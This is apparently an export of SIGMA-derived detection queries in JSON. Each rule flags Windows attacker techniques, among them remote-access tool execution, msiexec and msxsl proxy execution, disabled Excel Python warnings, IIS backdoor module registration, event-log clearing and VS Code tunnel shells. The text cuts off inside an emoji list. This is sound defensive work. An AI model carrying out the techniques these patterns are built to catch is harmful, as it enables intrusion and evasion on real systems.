            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 314
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Simple Help Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\JWrapper-Remote Access\\\" or tgt.process.image.path contains \"\\JWrapper-Remote Support\\\") and tgt.process.image.path contains \"\\SimpleService.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 315
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Msiexec Execute Arbitrary DLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\msiexec.exe\" and (tgt.process.cmdline contains \" -y\" or tgt.process.cmdline contains \" /y\" or tgt.process.cmdline contains \" \u2013y\" or tgt.process.cmdline contains \" \u2014y\" or tgt.process.cmdline contains \" \u2015y\")) and (not (tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y \\\"C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" /Y C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y \\\"C:\\Windows\\CCM\\\" or tgt.process.cmdline contains \"\\MsiExec.exe\\\" -Y C:\\Windows\\CCM\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 316
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed.\nThreat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Python Function Execution Security Warning Disabled In Excel",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Microsoft\\Office\\\" and tgt.process.cmdline contains \"\\Excel\\Security\" and tgt.process.cmdline contains \"PythonFunctionWarnings\") and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 317
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Suspicious IIS Module Registration",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\w3wp.exe\" and (tgt.process.cmdline contains \"appcmd.exe add module\" or (tgt.process.cmdline contains \" system.enterpriseservices.internal.publish\" and tgt.process.image.path contains \"\\powershell.exe\") or (tgt.process.cmdline contains \"gacutil\" and tgt.process.cmdline contains \" /I\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 318
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\nAdversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "Msxsl.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\msxsl.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 319
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the WMI class \"Win32_NTEventlogFile\" in a potentially suspicious way (delete, backup, change permissions, etc.) from a PowerShell script",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Call To Win32_NTEventlogFile Class",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Win32_NTEventlogFile\" and (tgt.process.cmdline contains \".BackupEventlog(\" or tgt.process.cmdline contains \".ChangeSecurityPermissions(\" or tgt.process.cmdline contains \".ChangeSecurityPermissionsEx(\" or tgt.process.cmdline contains \".ClearEventLog(\" or tgt.process.cmdline contains \".Delete(\" or tgt.process.cmdline contains \".DeleteEx(\" or tgt.process.cmdline contains \".Rename(\" or tgt.process.cmdline contains \".TakeOwnerShip(\" or tgt.process.cmdline contains \".TakeOwnerShipEx(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 320
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a shell (powershell, bash, wsl...) via Visual Studio Code tunnel. Attackers can abuse this functionality to establish a C2 channel and execute arbitrary commands on the system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Visual Studio Code Tunnel Shell Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\servers\\Stable-\" and src.process.image.path contains \"\\server\\node.exe\" and src.process.cmdline contains \".vscode-server\") and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and tgt.process.cmdline contains \"\\terminal\\browser\\media\\shellIntegration.ps1\") or (tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\bash.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 321
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - ScreenConnect Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"ScreenConnect Service\" or tgt.process.displayName=\"ScreenConnect\" or tgt.process.publisher=\"ScreenConnect Software\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 322
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 3",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83e\udd86\" or tgt.process.cmdline contains \"\ud83e\udd85\" or tgt.process.cmdline contains \"\ud83e\udd89\" or tgt.process.cmdline contains \"\ud83e\udd87\" or tgt.process.cmdline contains \"\ud83d\udc3a\" or tgt.process.cmdline contains \"\ud83d\udc17\" or tgt.process.cmdline contains \"\ud83d\udc34\" or tgt.process.cmdline contains \"\ud83e\udd84\" or tgt.process.cmdline contains \"\ud83d\udc1d\" or tgt.process.cmdline contains \"\ud83e\udeb1\" or tgt.process.cmdline contains \"\ud83d\udc1b\" or tgt.process.cmdline contains \"\ud83e\udd8b\" or tgt.process.cmdline contains \"\ud83d\udc0c\" or tgt.process.cmdline contains \"\ud83d\udc1e\" or tgt.process.cmdline contains \"\ud83d\udc1c\" or tgt.process.cmdline contains \"\ud83e\udeb0\" or tgt.process.cmdline contains \"\ud83e\udeb2\" or tgt.process.cmdline contains \"\ud83e\udeb3\" or tgt.process.cmdline contains \"\ud83e\udd9f\" or tgt.process.cmdline contains \"\ud83e\udd97\" or tgt.process.cmdline contains \"\ud83d\udd77\" or tgt.process.cmdline contains \"\ud83d\udd78\" or tgt.process.cmdline contains \"\ud83e\udd82\" or tgt.process.cmdline contains \"\ud83d\udc22\" or tgt.process.cmdline contains \"\ud83d\udc0d\" or tgt.process.cmdline contains \"\ud83e\udd8e\" or tgt.process.cmdline contains \"\ud83e\udd96\" or tgt.process.cmdline contains \"\ud83e\udd95\" or tgt.process.cmdline contains \"\ud83d\udc19\" or tgt.process.cmdline contains \"\ud83e\udd91\" or tgt.process.cmdline contains \"\ud83e\udd90\" or tgt.process.cmdline contains \"\ud83e\udd9e\" or tgt.process.cmdline contains \"\ud83e\udd80\" or tgt.process.cmdline contains \"\ud83e\udeb8\" or tgt.process.cmdline contains \"\ud83d\udc21\" or tgt.process.cmdline contains \"\ud83d\udc20\" or tgt.process.cmdline contains \"\ud83d\udc1f\" or tgt.process.cmdline contains \"\ud83d\udc2c\" or tgt.process.cmdline contains \"\ud83d\udc33\" or tgt.process.cmdline contains \"\ud83d\udc0b\" or tgt.process.cmdline contains \"\ud83e\udd88\" or tgt.process.cmdline contains \"\ud83d\udc0a\" or tgt.process.cmdline contains \"\ud83d\udc05\" or tgt.process.cmdline contains \"\ud83d\udc06\" or tgt.process.cmdline contains \"\ud83e\udd93\" or tgt.process.cmdline contains \"\ud83e\udd8d\" or tgt.process.cmdline contains \"\ud83e\udda7\" or tgt.process.cmdline contains \"\ud83e\udda3\" or tgt.process.cmdline contains \"\ud83d\udc18\" or tgt.process.cmdline contains \"\ud83e\udd9b\" or tgt.process.cmdline contains \"\ud83e\udd8f\" or tgt.process.cmdline contains \"\ud83d\udc2a\" or tgt.process.cmdline contains \"\ud83d\udc2b\" or tgt.process.cmdline contains \"\ud83e\udd92\" or tgt.process.cmdline contains \"\ud83e\udd98\" or tgt.process.cmdline contains \"\ud83e\uddac\" or tgt.process.cmdline contains \"\ud83d\udc03\" or tgt.process.cmdline contains \"\ud83d\udc02\" or tgt.process.cmdline contains \"\ud83d\udc04\" or tgt.process.cmdline contains \"\ud83d\udc0e\" or tgt.process.cmdline contains \"\ud83d\udc16\" or tgt.process.cmdline contains \"\ud83d\udc0f\" or tgt.process.cmdline contains \"\ud83d\udc11\" or tgt.process.cmdline contains \"\ud83e\udd99\" or tgt.process.cmdline contains \"\ud83d\udc10\" or tgt.process.cmdline contains \"\ud83e\udd8c\" or tgt.process.cmdline contains \"\ud83d\udc15\" or tgt.process.cmdline contains \"\ud83d\udc29\" or tgt.process.cmdline contains \"\ud83e\uddae\" or tgt.process.cmdline contains \"\ud83d\udc15\u200d\ud83e\uddba\" or tgt.process.cmdline contains \"\ud83d\udc08\" or tgt.process.cmdline contains \"\ud83d\udc08\u200d\u2b1b\" or tgt.process.cmdline contains \"\ud83e\udeb6\" or tgt.process.cmdline contains \"\ud83d\udc13\" or tgt.process.cmdline contains \"\ud83e\udd83\" or tgt.process.cmdline contains \"\ud83e\udda4\" or tgt.process.cmdline contains \"\ud83e\udd9a\" or tgt.process.cmdline contains \"\ud83e\udd9c\" or tgt.process.cmdline contains \"\ud83e\udda2\" or tgt.process.cmdline contains \"\ud83e\udda9\" or tgt.process.cmdline contains \"\ud83d\udd4a\" or tgt.process.cmdline contains \"\ud83d\udc07\" or tgt.process.cmdline contains \"\ud83e\udd9d\" or tgt.process.cmdline contains \"\ud83e\udda8\" or tgt.process.cmdline contains \"\ud83e\udda1\" or tgt.process.cmdline contains \"\ud83e\uddab\" or tgt.process.cmdline contains \"\ud83e\udda6\" or tgt.process.cmdline contains \"\ud83e\udda5\" or tgt.process.cmdline contains \"\ud83d\udc01\" or tgt.process.cmdline contains \"\ud83d\udc00\" or tgt.process.cmdline contains \"\ud83d\udc3f\" or tgt.process.cmdline contains \"\ud83e\udd94\" or tgt.process.cmdline contains \"\ud83d\udc3e\" or tgt.process.cmdline contains \"\ud83d\udc09\" or tgt.process.cmdline contains \"\ud83d\udc32\" or tgt.process.cmdline contains \"\ud83c\udf35\" or tgt.process.cmdline contains \"\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf32\" or tgt.process.cmdline contains \"\ud83c\udf33\" or tgt.process.cmdline contains \"\ud83c\udf34\" or tgt.process.cmdline contains \"\ud83e\udeb9\" or tgt.process.cmdline contains \"\ud83e\udeba\" or tgt.process.cmdline contains \"\ud83e\udeb5\" or tgt.process.cmdline contains \"\ud83c\udf31\" or tgt.process.cmdline contains \"\ud83c\udf3f\" or tgt.process.cmdline contains \"\u2618\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf40\" or tgt.process.cmdline contains \"\ud83c\udf8d\" or tgt.process.cmdline contains \"\ud83e\udeb4\" or tgt.process.cmdline contains \"\ud83c\udf8b\" or tgt.process.cmdline contains \"\ud83c\udf43\" or tgt.process.cmdline contains \"\ud83c\udf42\" or tgt.process.cmdline contains \"\ud83c\udf41\" or tgt.process.cmdline contains \"\ud83c\udf44\" or tgt.process.cmdline contains \"\ud83d\udc1a\" or tgt.process.cmdline contains \"\ud83e\udea8\" or tgt.process.cmdline contains \"\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc90\" or tgt.process.cmdline contains \"\ud83c\udf37\" or tgt.process.cmdline contains \"\ud83e\udeb7\" or tgt.process.cmdline contains \"\ud83c\udf39\" or tgt.process.cmdline contains \"\ud83e\udd40\" or tgt.process.cmdline contains \"\ud83c\udf3a\" or tgt.process.cmdline contains \"\ud83c\udf38\" or tgt.process.cmdline contains \"\ud83c\udf3c\" or tgt.process.cmdline contains \"\ud83c\udf3b\" or tgt.process.cmdline contains \"\ud83c\udf1e\" or tgt.process.cmdline contains \"\ud83c\udf1d\" or tgt.process.cmdline contains \"\ud83c\udf1b\" or tgt.process.cmdline contains \"\ud83c\udf1c\" or tgt.process.cmdline contains \"\ud83c\udf1a\" or tgt.process.cmdline contains \"\ud83c\udf15\" or tgt.process.cmdline contains \"\ud83c\udf16\" or tgt.process.cmdline contains \"\ud83c\udf17\" or tgt.process.cmdline contains \"\ud83c\udf18\" or tgt.process.cmdline contains \"\ud83c\udf11\" or tgt.process.cmdline contains \"\ud83c\udf12\" or tgt.process.cmdline contains \"\ud83c\udf13\" or tgt.process.cmdline contains \"\ud83c\udf14\" or tgt.process.cmdline contains \"\ud83c\udf19\" or tgt.process.cmdline contains \"\ud83c\udf0e\" or tgt.process.cmdline contains \"\ud83c\udf0d\" or tgt.process.cmdline contains \"\ud83c\udf0f\" or tgt.process.cmdline contains \"\ud83e\ude90\" or tgt.process.cmdline contains \"\ud83d\udcab\" or tgt.process.cmdline contains \"\u2b50\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf1f\" or tgt.process.cmdline contains \"\u2728\" or tgt.process.cmdline contains \"\u26a1\ufe0f\" or tgt.process.cmdline contains \"\u2604\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udca5\" or tgt.process.cmdline contains \"\ud83d\udd25\" or tgt.process.cmdline contains \"\ud83c\udf2a\" or tgt.process.cmdline contains \"\ud83c\udf08\" or tgt.process.cmdline contains \"\u2600\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf24\" or tgt.process.cmdline contains \"\u26c5\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf25\" or tgt.process.cmdline contains \"\u2601\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf26\" or tgt.process.cmdline contains \"\ud83c\udf27\" or tgt.process.cmdline contains \"\u26c8\" or tgt.process.cmdline contains \"\ud83c\udf29\" or tgt.process.cmdline contains \"\ud83c\udf28\" or tgt.process.cmdline contains \"\u2744\ufe0f\" or tgt.process.cmdline contains \"\u2603\ufe0f\" or tgt.process.cmdline contains \"\u26c4\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf2c\" or tgt.process.cmdline contains \"\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\udca7\" or tgt.process.cmdline contains \"\ud83d\udca6\" or tgt.process.cmdline contains \"\ud83e\udee7\" or tgt.process.cmdline contains \"\u2614\ufe0f\" or tgt.process.cmdline contains \"\u2602\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf0a\" or tgt.process.cmdline contains \"\ud83c\udf2b\ud83c\udf4f\" or tgt.process.cmdline contains \"\ud83c\udf4e\" or tgt.process.cmdline contains \"\ud83c\udf50\" or tgt.process.cmdline contains \"\ud83c\udf4a\" or tgt.process.cmdline contains \"\ud83c\udf4b\" or tgt.process.cmdline contains \"\ud83c\udf4c\" or tgt.process.cmdline contains \"\ud83c\udf49\" or tgt.process.cmdline contains \"\ud83c\udf47\" or tgt.process.cmdline contains \"\ud83c\udf53\" or tgt.process.cmdline contains \"\ud83e\uded0\" or tgt.process.cmdline contains \"\ud83c\udf48\" or tgt.process.cmdline contains \"\ud83c\udf52\" or tgt.process.cmdline contains \"\ud83c\udf51\" or tgt.process.cmdline contains \"\ud83e\udd6d\" or tgt.process.cmdline contains \"\ud83c\udf4d\" or tgt.process.cmdline contains \"\ud83e\udd65\" or tgt.process.cmdline contains \"\ud83e\udd5d\" or tgt.process.cmdline contains \"\ud83c\udf45\" or tgt.process.cmdline contains \"\ud83c\udf46\" or tgt.process.cmdline contains \"\ud83e\udd51\" or tgt.process.cmdline contains \"\ud83e\udd66\" or tgt.process.cmdline contains \"\ud83e\udd6c\" or tgt.process.cmdline contains \"\ud83e\udd52\" or tgt.process.cmdline contains \"\ud83c\udf36\" or tgt.process.cmdline contains \"\ud83e\uded1\" or tgt.process.cmdline contains \"\ud83c\udf3d\" or tgt.process.cmdline contains \"\ud83e\udd55\" or tgt.process.cmdline contains \"\ud83e\uded2\" or tgt.process.cmdline contains \"\ud83e\uddc4\" or tgt.process.cmdline contains \"\ud83e\uddc5\" or tgt.process.cmdline contains \"\ud83e\udd54\" or tgt.process.cmdline contains \"\ud83c\udf60\" or tgt.process.cmdline contains \"\ud83e\uded8\" or tgt.process.cmdline contains \"\ud83e\udd50\" or tgt.process.cmdline contains \"\ud83e\udd6f\" or tgt.process.cmdline contains \"\ud83c\udf5e\" or tgt.process.cmdline contains \"\ud83e\udd56\" or tgt.process.cmdline contains \"\ud83e\udd68\" or tgt.process.cmdline contains \"\ud83e\uddc0\" or tgt.process.cmdline contains \"\ud83e\udd5a\" or tgt.process.cmdline contains \"\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddc8\" or tgt.process.cmdline contains \"\ud83e\udd5e\" or tgt.process.cmdline contains \"\ud83e\uddc7\" or tgt.process.cmdline contains \"\ud83e\udd53\" or tgt.process.cmdline contains \"\ud83e\udd69\" or tgt.process.cmdline contains \"\ud83c\udf57\" or tgt.process.cmdline contains \"\ud83c\udf56\" or tgt.process.cmdline contains \"\ud83e\uddb4\" or tgt.process.cmdline contains \"\ud83c\udf2d\" or tgt.process.cmdline contains \"\ud83c\udf54\" or tgt.process.cmdline contains \"\ud83c\udf5f\" or tgt.process.cmdline contains \"\ud83c\udf55\" or tgt.process.cmdline contains \"\ud83e\uded3\" or tgt.process.cmdline contains \"\ud83e\udd6a\" or tgt.process.cmdline contains \"\ud83e\udd59\" or tgt.process.cmdline contains \"\ud83e\uddc6\" or tgt.process.cmdline contains \"\ud83c\udf2e\" or tgt.process.cmdline contains \"\ud83c\udf2f\" or tgt.process.cmdline contains \"\ud83e\uded4\" or tgt.process.cmdline contains \"\ud83e\udd57\" or tgt.process.cmdline contains \"\ud83e\udd58\" or tgt.process.cmdline contains \"\ud83e\uded5\" or tgt.process.cmdline contains \"\ud83e\udd6b\" or tgt.process.cmdline contains \"\ud83c\udf5d\" or tgt.process.cmdline contains \"\ud83c\udf5c\" or tgt.process.cmdline contains \"\ud83c\udf72\" or tgt.process.cmdline contains \"\ud83c\udf5b\" or 